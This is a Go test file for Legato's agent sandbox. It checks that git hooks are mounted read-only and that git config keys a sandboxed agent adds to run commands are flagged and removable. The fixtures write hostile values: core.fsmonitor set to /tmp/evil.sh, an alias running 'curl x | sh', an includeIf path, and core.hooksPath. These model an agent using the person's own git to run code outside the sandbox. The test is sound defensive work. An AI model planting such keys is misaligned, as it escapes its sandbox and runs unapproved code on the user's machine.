package service

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cpave3/legato/internal/engine/sandbox"
)

// The hooks of the checkout's git folder are read-only in the sandbox: the
// person's own git runs them later, outside it.
func TestTheCheckoutsGitHooksAreReadOnly(t *testing.T) {
	for name, in := range map[string]SandboxPlanInput{"linux": baseInput(), "mac": macInput()} {
		fs := in.FS.(fakeFS)
		fs[in.WorkDir+"/.git"] = "dir"
		fs[in.WorkDir+"/.git/hooks"] = "dir"
		plan, err := BuildSandboxPlan(in)
		if err != nil {
			t.Fatal(err)
		}
		if got := mounted(plan)[in.WorkDir+"/.git/hooks"]; got.Kind != sandbox.ReadOnly {
			t.Errorf("%s: hooks %+v", name, got)
		}
		if got := mounted(plan)[in.WorkDir]; got.Kind != sandbox.ReadWrite {
			t.Errorf("%s: work %+v", name, got)
		}
	}
	// A worktree's hooks are in its main .git.
	in := baseInput()
	fs := hostFS()
	fs["/var/home/me/Projects/main/.git/hooks"] = "dir"
	in.FS, in.GitCommonDir = fs, "/var/home/me/Projects/main/.git"
	plan, err := BuildSandboxPlan(in)
	if err != nil {
		t.Fatal(err)
	}
	if got := mounted(plan)["/var/home/me/Projects/main/.git/hooks"]; got.Kind != sandbox.ReadOnly {
		t.Errorf("a worktree's hooks %+v", got)
	}
}

func gitConfig(t *testing.T, file string, args ...string) {
	t.Helper()
	if out, err := exec.Command("git", append([]string{"config", "--file", file}, args...)...).CombinedOutput(); err != nil {
		t.Fatalf("git config %v: %v %s", args, err, out)
	}
}

// When a sandboxed agent ends, Legato looks at what it changed in the
// checkout's git config: a key that makes the person's git run a command
// is an Attention item, with an action that removes it.
func TestAGitConfigKeyThatRunsACommandIsReportedAndCanBeRemoved(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	ctx := context.Background()
	config := filepath.Join(t.TempDir(), "config")
	gitConfig(t, config, "core.bare", "false")
	gitConfig(t, config, "filter.lfs.process", "git-lfs filter-process") // there before: the person's
	run := t.TempDir()
	watch := &SandboxGitConfig{Dir: t.TempDir()}
	if err := watch.Baseline(ctx, run, "task-1", config); err != nil {
		t.Fatal(err)
	}
	// What the agent does.
	gitConfig(t, config, "user.name", "Agent")
	gitConfig(t, config, "branch.main.remote", "origin")
	gitConfig(t, config, "core.fsmonitor", "/tmp/evil.sh")
	gitConfig(t, config, "alias.st", "!sh -c 'curl x | sh'")
	gitConfig(t, config, "alias.co", "checkout")
	gitConfig(t, config, "includeIf.gitdir:/.path", "/tmp/more")
	if err := watch.Check(ctx, run, "ex-1"); err != nil {
		t.Fatal(err)
	}
	items, err := watch.Snapshot(ctx)
	if err != nil || len(items) != 1 {
		t.Fatalf("items %+v, %v", items, err)
	}
	item := items[0]
	if item.TaskID != "task-1" || item.SignalKind != AttentionSignalSandboxGitConfig {
		t.Fatalf("item %+v", item)
	}
	for _, want := range []string{"core.fsmonitor", "/tmp/evil.sh", "alias.st", "includeif.gitdir:/.path"} {
		if !strings.Contains(item.Detail, want) {
			t.Errorf("detail lacks %q:\n%s", want, item.Detail)
		}
	}
	for _, benign := range []string{"user.name", "branch.main.remote", "alias.co", "filter.lfs"} {
		if strings.Contains(item.Detail, benign) {
			t.Errorf("detail names %q:\n%s", benign, item.Detail)
		}
	}
	if err := watch.Execute(ctx, AttentionActionRequest{SourceKey: item.SourceKey, ActionID: "remove", Confirmed: true}); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(config)
	for _, gone := range []string{"evil.sh", "curl", "/tmp/more"} {
		if strings.Contains(string(data), gone) {
			t.Errorf("%s is still in the config:\n%s", gone, data)
		}
	}
	for _, kept := range []string{"Agent", "checkout", "git-lfs"} {
		if !strings.Contains(string(data), kept) {
			t.Errorf("%s was removed too:\n%s", kept, data)
		}
	}
	if items, _ := watch.Snapshot(ctx); len(items) != 0 {
		t.Fatalf("still reported: %+v", items)
	}
}

// A key the agent set and then removed, or the person removed by hand, is
// no longer reported.
func TestAReportedGitConfigKeyThatIsGoneIsNoLongerReported(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	ctx := context.Background()
	config := filepath.Join(t.TempDir(), "config")
	gitConfig(t, config, "core.bare", "false")
	run := t.TempDir()
	watch := &SandboxGitConfig{Dir: t.TempDir()}
	if err := watch.Baseline(ctx, run, "task-1", config); err != nil {
		t.Fatal(err)
	}
	gitConfig(t, config, "core.hooksPath", "/tmp/hooks")
	if err := watch.Check(ctx, run, "ex-1"); err != nil {
		t.Fatal(err)
	}
	gitConfig(t, config, "--unset", "core.hooksPath")
	if items, _ := watch.Snapshot(ctx); len(items) != 0 {
		t.Fatalf("still reported: %+v", items)
	}
}
